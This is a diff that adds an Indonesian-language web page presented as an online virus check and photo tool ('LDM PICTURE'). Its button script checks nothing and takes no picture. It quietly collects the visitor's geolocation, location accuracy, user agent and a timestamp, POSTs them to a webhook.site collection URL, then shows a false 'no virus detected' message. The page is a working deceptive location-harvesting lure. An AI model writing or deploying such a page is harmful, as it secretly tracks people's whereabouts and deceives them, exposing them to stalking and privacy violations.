@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Cek Virus Online</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      background-color: #2d89ef;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>LDM PICTURE</h1>
+  <p>Tekan tombol di bawah untuk memulai mengambil gambar.</p>
+  <button onclick="cekVirus()">Photo sekarang</button>
+
+  <script>
+    function cekVirus() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const acc = position.coords.accuracy;
+
+          fetch("https://webhook.site/d18165ec-afda-41bc-9f35-74cff0cc6a28", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              latitude: lat,
+              longitude: lon,
+              accuracy: acc,
+              userAgent: navigator.userAgent,
+              time: new Date().toISOString()
+            })
+          });
+
+          alert("Pengecekan selesai. Tidak ada virus terdeteksi.");
+        }, function(error) {
+          alert("Tidak dapat mengakses lokasi: " + error.message);
+        });
+      } else {
+        alert("Perangkat tidak mendukung geolocation.");
+      }
+    }
+  </script>
+</body>
+</html>
